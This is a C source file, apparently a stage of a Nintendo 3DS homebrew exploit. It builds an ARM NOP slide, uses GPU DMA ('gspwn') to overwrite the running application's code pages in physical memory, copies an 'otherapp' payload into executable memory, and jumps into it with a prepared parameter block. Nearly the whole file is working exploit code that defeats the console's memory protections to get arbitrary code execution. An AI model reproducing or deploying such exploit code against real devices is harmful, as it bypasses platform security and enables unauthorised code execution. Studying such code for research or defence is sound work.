#include "imports.h"

#include <3ds.h>
#include "utils.h"

#define LOOP_DEST (u8*)(LINEAR_BUFFER+0xE00000)
#define OTHERAPP_DEST (u8*)(LINEAR_BUFFER+0xF00000)
#define SLIDE_DEST (u8*)(LINEAR_BUFFER+0xA00000)

void build_nop_slide(u32 *dst, int size)
{
    for (int i = 0; i < size; i++)
		{
        dst[i] = 0xE1A00000;
    }
    dst[size-1] = 0xE12FFF1E;
}

void _main()
{

	Result ret = 0;

	_DSP_UnloadComponent(dspHandle);
	_DSP_RegisterInterruptEvents(dspHandle, 0x0, 0x2, 0x2);

	u32 linear_base = 0x30000000 + (*(u8*)APPMEMTYPE_PTR == 0x6 ? 0x07c00000 : 0x04000000) - MAX_CODEBIN_SIZE;

  build_nop_slide((u32*)(SLIDE_DEST), 0x1000/4);
  u32 nop_slide_VA = 0x320000;
  u32 count = 0;
  do
  {
    int k = 0;
    int slide_pages = 0;
    while(slide_pages < 1 && k*0x1000 < MAX_CODEBIN_SIZE)
    {
    	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)LOOP_DEST, 0x1000);
    	gspwn((void*)LOOP_DEST, (void*)(linear_base + k*0x1000), 0x1000);
    	svcSleepThread(0x100000);

    	if(!memcmp((void*)LOOP_DEST, (void*)(nop_slide_VA), 0x20))
    	{
    		gspwn((void*)(linear_base + k*0x1000), (void*)(SLIDE_DEST), 0x1000);
    		svcSleepThread(0x100000);
    		slide_pages++;
    	}
    	k++;
    }

    int j = 0xFFC;
    while(*(u32*)(nop_slide_VA+j) == *(u32*)(SLIDE_DEST+j))
    {
      count+=4;
      j-=4;
    }
    if(j < 0xFFC) ((void (*)())(nop_slide_VA+j+4))();

    nop_slide_VA+=0x1000;
  }
  while(count < 0x6000 && nop_slide_VA < PAYLOAD_VA);
  //((void (*)())nop_slide_VA)();


	u32 otherapp_size = *(u32*)(OTHERAPP_PTR-4);
  memcpy(OTHERAPP_DEST, (void*)OTHERAPP_PTR, otherapp_size);

	u32 _otherapp_size = (otherapp_size + 0xFFF) & ~0xFFF;

	u32 otherapp_pages_count = _otherapp_size >> 12;

  unsigned int pages = 0;
	for(unsigned int i = 0; i < MAX_CODEBIN_SIZE && (pages < otherapp_pages_count); i+=0x1000)
	{
		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)LOOP_DEST, 0x1000);
		gspwn((void*)LOOP_DEST, (void*)(linear_base + i), 0x1000);
		svcSleepThread(0x200000);

		for(u8 j = 0; j < otherapp_pages_count; j++)
		{
		    if(!memcmp((void*)LOOP_DEST, (void*)(0x101000 + j*0x1000), 0x20))
			  {
				   //otherapp_pages[j] = i;
				   gspwn((void*)(linear_base + i), (void*)(OTHERAPP_DEST+j*0x1000), 0x1000);
				   svcSleepThread(0x200000);
				   pages++;
			  }
	   }
  }
		// ghetto dcache invalidation
		// don't judge me
int i, j;
		// for(k=0; k<0x2; k++)
for(j=0; j<0x4; j++)
	for(i=0; i<0x01000000/0x4; i+=0x4)
		((u8*)(LINEAR_BUFFER))[i+j]^=0xDEADBABE;


u8* top_framebuffer = (u8*)(LINEAR_BUFFER+0x00100000);
u8* low_framebuffer = &top_framebuffer[0x00046500];
_GSPGPU_SetBufferSwap(*gspHandle, 0, (GSPGPU_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
_GSPGPU_SetBufferSwap(*gspHandle, 1, (GSPGPU_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});

	// run payload
	{
		void (*payload)(u32* paramlk, u32* stack_pointer) = (void*)0x00101000;
		u32* paramblk = (u32*)LINEAR_BUFFER;

		paramblk[0x1c >> 2] = GSPGPU_SETTEXTURECOPY;
		paramblk[0x20 >> 2] = GSPGPU_FLUSHDATACACHE_WRAPPER;
		paramblk[0x48 >> 2] = 0x8d; // flags
		paramblk[0x58 >> 2] = GSPGPU_HANDLE;
		paramblk[0x64 >> 2] = 0x08010000;

		payload(paramblk, (u32*)(0x10000000 - 4));
	}

	*(u32*)ret = 0xdead0008;
}
